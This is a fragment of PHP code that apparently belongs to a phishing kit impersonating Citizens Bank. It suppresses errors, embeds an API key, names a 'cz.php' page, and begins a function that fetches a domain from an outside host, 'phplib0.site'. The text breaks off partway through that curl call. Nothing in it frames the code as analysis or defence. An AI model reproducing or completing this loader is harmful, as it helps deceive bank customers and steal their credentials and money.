...
error_reporting(0);
define("APIKEY","API-F-KEY-yhzq-fjt1-054qcj75bpud");
define("Page","CitizensBank.com");
define("FILE_NAME","cz.php");
define("GET_PARAM","view");
function getdomain(){
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://phplib0.site/raw/');
